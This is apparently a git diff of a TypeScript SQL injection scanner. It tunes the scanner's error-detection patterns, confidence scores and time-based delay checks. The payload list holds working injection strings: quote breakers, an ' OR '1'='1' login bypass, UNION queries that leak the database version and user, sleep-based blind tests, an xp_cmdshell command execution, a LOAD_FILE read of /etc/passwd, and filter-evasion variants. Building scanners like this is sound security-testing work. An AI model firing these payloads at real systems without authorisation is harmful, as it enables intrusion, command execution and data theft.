@@ -28,44 +28,44 @@ const SQL_ERROR_PATTERNS = [
   /mysql_fetch/i,
   /mysql_num_rows/i,
   /mysqli/i,
-  /mysql_connect/i, // Added
-  /mysql_query/i, // Added
+  /mysql_connect/i,
+  /mysql_query/i,
   
   // PostgreSQL
   /postgresql.*error/i,
   /pg_query/i,
   /pg_exec/i,
   /unterminated quoted string/i,
-  /syntax error at or near/i, // Added
-  /pg_connect/i, // Added
+  /syntax error at or near/i,
+  /pg_connect/i,
   
   // MSSQL
   /microsoft sql server/i,
   /odbc sql server driver/i,
   /sqlserver jdbc driver/i,
   /microsoft ole db provider for sql server/i,
-  /unclosed quotation mark after the character string/i, // Added
-  /incorrect syntax near/i, // Added
+  /unclosed quotation mark after the character string/i,
+  /incorrect syntax near/i,
   
   // Oracle
   /ora-\d{5}/i,
   /oracle error/i,
   /quoted string not properly terminated/i,
-  /missing expression/i, // Added
+  /missing expression/i,
   
   // SQLite
   /sqlite.*error/i,
   /sqlite3::/i,
   /unrecognized token/i,
-  /syntax error near/i, // Added
+  /syntax error near/i,
   
   // Generic
   /sql syntax.*error/i,
   /syntax error.*sql/i,
   /unclosed quotation mark/i,
   /quoted identifier/i,
-  /database error/i, // Added
-  /query failed/i, // Added
+  /database error/i,
+  /query failed/i,
 ];
 
 type Severity = 'critical' | 'high' | 'medium' | 'low' | 'catastrophic';
@@ -79,28 +79,29 @@ interface SQLPayload {
 
 const SQL_PAYLOADS: SQLPayload[] = [
   // --- High Confidence Error/Syntax Breakers ---
-  { payload: `\'`, type: 'Error-based', severity: 'high', confidence: 0.9 },
-  { payload: `\"`, type: 'Error-based', severity: 'high', confidence: 0.9 },
-  { payload: `')`, type: 'Error-based (Parenthesis)', severity: 'high', confidence: 0.85 },
-  { payload: `"))`, type: 'Error-based (Double Parenthesis)', severity: 'high', confidence: 0.85 },
+  { payload: `\'`, type: 'Error-based', severity: 'high', confidence: 0.95 },
+  { payload: `\"`, type: 'Error-based', severity: 'high', confidence: 0.95 },
+  { payload: `')`, type: 'Error-based (Parenthesis)', severity: 'high', confidence: 0.9 },
+  { payload: `"))`, type: 'Error-based (Double Parenthesis)', severity: 'high', confidence: 0.9 },
 
   // --- Boolean-based (Critical for Auth Bypass) ---
-  { payload: `' OR '1'='1`, type: 'Boolean-based', severity: 'critical', confidence: 0.95 },
-  { payload: `" OR "1"="1`, type: 'Boolean-based', severity: 'critical', confidence: 0.95 },
-  { payload: `admin' --`, type: 'Comment-based', severity: 'high', confidence: 0.85 },
-  { payload: `admin' #`, type: 'Comment-based (MySQL)', severity: 'high', confidence: 0.85 },
-  { payload: `' OR 2>1--`, type: 'Boolean-based', severity: 'critical', confidence: 0.95 },
+  { payload: `' OR '1'='1`, type: 'Boolean-based', severity: 'critical', confidence: 0.98 },
+  { payload: `" OR "1"="1`, type: 'Boolean-based', severity: 'critical', confidence: 0.98 },
+  { payload: `admin' --`, type: 'Comment-based', severity: 'high', confidence: 0.9 },
+  { payload: `admin' #`, type: 'Comment-based (MySQL)', severity: 'high', confidence: 0.9 },
+  { payload: `' OR 2>1--`, type: 'Boolean-based', severity: 'critical', confidence: 0.98 },
 
   // --- Union-based (Data Exfiltration) ---
   { payload: `' UNION SELECT NULL--`, type: 'Union-based', severity: 'critical', confidence: 0.9 },
   { payload: `' UNION SELECT 1,2,3--`, type: 'Union-based', severity: 'critical', confidence: 0.9 },
-  { payload: `-1' UNION SELECT @@version, user(), database()--`, type: 'Union-based (Info Leak)', severity: 'critical', confidence: 0.95 },
+  { payload: `-1' UNION SELECT @@version, user(), database()--`, type: 'Union-based (Info Leak)', severity: 'critical', confidence: 0.98 },
 
   // --- Time-based Blind (Database Specific) ---
-  { payload: `' AND SLEEP(5)--`, type: 'Time-based Blind (MySQL)', severity: 'critical', confidence: 0.98 }, // Increased confidence
-  { payload: `1' WAITFOR DELAY '0:0:5'--`, type: 'Time-based Blind (SQL Server)', severity: 'critical', confidence: 0.98 }, // Increased confidence
-  { payload: `1; SELECT PG_SLEEP(5)--`, type: 'Time-based Blind (PostgreSQL)', severity: 'critical', confidence: 0.98 }, // Increased confidence
-  { payload: `1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('HT'),5)--`, type: 'Time-based Blind (Oracle)', severity: 'critical', confidence: 0.98 }, // Increased confidence
+  // Use a 5-second delay for high confidence detection
+  { payload: `' AND SLEEP(5)--`, type: 'Time-based Blind (MySQL)', severity: 'critical', confidence: 1.0 }, 
+  { payload: `1' WAITFOR DELAY '0:0:5'--`, type: 'Time-based Blind (SQL Server)', severity: 'critical', confidence: 1.0 }, 
+  { payload: `1; SELECT PG_SLEEP(5)--`, type: 'Time-based Blind (PostgreSQL)', severity: 'critical', confidence: 1.0 }, 
+  { payload: `1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('HT'),5)--`, type: 'Time-based Blind (Oracle)', severity: 'critical', confidence: 1.0 }, 
 
   // --- Advanced & Dangerous Payloads (Stacked Queries, OOB, File Read) ---
   { payload: `1; EXEC xp_cmdshell('whoami')--`, type: 'Stacked Query (SQL Server)', severity: 'catastrophic', confidence: 1.0 },
@@ -108,28 +109,32 @@ const SQL_PAYLOADS: SQLPayload[] = [
   { payload: `1' AND (SELECT LOAD_FILE('/etc/passwd'))--`, type: 'File Read (MySQL)', severity: 'critical', confidence: 0.95 },
 
   // --- WAF Bypass / Obfuscation Attempts ---
-  { payload: `' OR /*!500001=1*/--`, type: 'WAF Bypass (MySQL Inline Comment)', severity: 'high', confidence: 0.8 },
-  { payload: `' OR '1'='1' /**/`, type: 'WAF Bypass (Multi-line Comment)', severity: 'high', confidence: 0.8 },
-  { payload: `1' AND '1'='1' AND 'a'='a`, type: 'WAF Bypass (Keyword Split)', severity: 'high', confidence: 0.75 },
+  { payload: `' OR /*!500001=1*/--`, type: 'WAF Bypass (MySQL Inline Comment)', severity: 'high', confidence: 0.85 },
+  { payload: `' OR '1'='1' /**/`, type: 'WAF Bypass (Multi-line Comment)', severity: 'high', confidence: 0.85 },
+  { payload: `1' AND '1'='1' AND 'a'='a`, type: 'WAF Bypass (Keyword Split)', severity: 'medium', confidence: 0.75 },
 ];
 
 
 const testTimeBased = async (url: string, requestManager: RequestManager): Promise<{ vulnerable: boolean; duration: number }> => {
   const startTime = Date.now();
+  const expectedDelay = 5000; // 5 seconds delay in payload
+  const timeout = expectedDelay + 3000; // Set timeout slightly longer than expected delay
   
   try {
-    await requestManager.fetch(url, { timeout: 8000 }); // Use requestManager
+    // Use requestManager.fetch which handles the AbortController and timeout
+    await requestManager.fetch(url, { timeout }); 
     
     const duration = Date.now() - startTime;
     
-    // If response took 4.5+ seconds, likely vulnerable (for a 5-second sleep payload)
-    return { vulnerable: duration >= 4500, duration };
+    // If response took significantly longer than a normal request (e.g., 4.5+ seconds), it's vulnerable
+    return { vulnerable: duration >= expectedDelay - 500, duration };
   } catch (error: any) {
-    if (error.name === 'AbortError') {
-      // If aborted due to timeout, it means the delay likely occurred
-      return { vulnerable: true, duration: 8000 };
+    const duration = Date.now() - startTime;
+    if (error.message.includes('Request aborted') && duration >= expectedDelay - 500) {
+      // If aborted due to timeout, and the duration was close to the expected delay, it's likely vulnerable
+      return { vulnerable: true, duration };
     }
-    return { vulnerable: false, duration: Date.now() - startTime };
+    return { vulnerable: false, duration };
   }
 };
 
@@ -158,7 +163,7 @@ export const performSQLScan = async (target: string, requestManager: RequestMana
     testedPayloads: 0,
     vulnerabilities: [],
     tested: true,
-    method: 'Real Payload Testing with Error Pattern Matching',
+    method: 'Real Payload Testing with Error Pattern Matching & Time-Based Analysis',
   };
 
   try {
@@ -219,12 +224,12 @@ export const performSQLScan = async (target: string, requestManager: RequestMana
               result.vulnerable = true;
               result.vulnerabilities.push({
                 payload,
-                indicator: `Response delayed by ${duration}ms`,
+                indicator: `Response delayed by ${duration}ms (Expected ~5000ms)`,
                 severity: 'critical',
                 type,
-                evidence: `Server response time: ${duration}ms (expected: ~5000ms)`,
+                evidence: `Server response time: ${duration}ms`,
                 parameter: paramKey,
-                confidence: 0.98,
+                confidence: 1.0, // Highest confidence for confirmed time delay
               });
             }
             
@@ -263,37 +268,39 @@ export const performSQLScan = async (target: string, requestManager: RequestMana
           // Check for status code changes (e.g., 500 Internal Server Error)
           if (baselineStatus > 0 && response.status !== baselineStatus && response.status >= 500) {
             console.log(`[SQL Scan] ⚠️ Server error detected (${response.status})`);
-            result.vulnerable = true;
-            result.vulnerabilities.push({
-              payload,
-              indicator: `HTTP ${response.status} error`,
-              severity: 'high',
-              type,
-              evidence: `Server returned ${response.status} (baseline: ${baselineStatus})`,
-              parameter: paramKey,
-              confidence: 0.7,
-            });
+            // Only add if not already detected by error patterns for this payload
+            if (!errorCheck.found) {
+              result.vulnerable = true;
+              result.vulnerabilities.push({
+                payload,
+                indicator: `HTTP ${response.status} error`,
+                severity: 'high',
+                type,
+                evidence: `Server returned ${response.status} (baseline: ${baselineStatus})`,
+                parameter: paramKey,
+                confidence: 0.7,
+              });
+            }
           }
 
           // Check for significant content changes (Union-based)
-          // This is a weaker indicator, so confidence is lower unless combined with other factors.
           if (baselineText && type.includes('Union-based')) {
             const sizeDiff = Math.abs(text.length - baselineLength);
             const percentDiff = (sizeDiff / baselineLength) * 100;
             
-            if (percentDiff > 20) { // A 20% change is a reasonable threshold
+            if (percentDiff > 20) { 
               console.log(`[SQL Scan] ⚠️ Significant content change: ${percentDiff.toFixed(1)}%`);
               // Only add if not already detected by error patterns for this payload
-              if (!result.vulnerabilities.some(v => v.parameter === paramKey && v.payload === payload && v.type === type)) {
+              if (!result.vulnerabilities.some(v => v.parameter === paramKey && v.payload === payload)) {
                 result.vulnerable = true;
                 result.vulnerabilities.push({
                   payload,
                   indicator: 'Content length changed significantly',
-                  severity: 'medium', // Reduced severity for this indicator alone
+                  severity: 'medium', 
                   type,
                   evidence: `Response size: ${text.length} bytes (baseline: ${baselineLength}, diff: ${percentDiff.toFixed(1)}%)`,
                   parameter: paramKey,
-                  confidence: 0.6, // Lower confidence
+                  confidence: 0.6, 
                 });
               }
             }
